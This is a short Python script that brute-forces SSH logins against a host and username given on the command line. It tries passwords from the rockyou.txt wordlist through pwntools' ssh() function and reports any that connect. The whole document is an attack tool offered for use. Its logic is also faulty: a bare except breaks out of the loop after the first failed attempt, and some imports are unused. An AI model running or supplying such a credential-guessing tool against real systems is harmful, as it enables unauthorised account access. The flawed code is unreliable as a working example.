import sys
import string
from pwn import *
import paramiko

if len(sys.argv) < 3:
    print("[*] Use : python3 ssh-brute-forcing.py <host> <user>")
    sys.exit(1)

host = sys.argv[1]
username = sys.argv[2]


with open("rockyou.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            response = ssh(host=host, username=username, password=password, timeout=1)
            if response.connected():
                print(f"The password {password} is valid!")
                response.close()
                break
        except:
            print("The data assigned for connection is incorrect!")
            break 
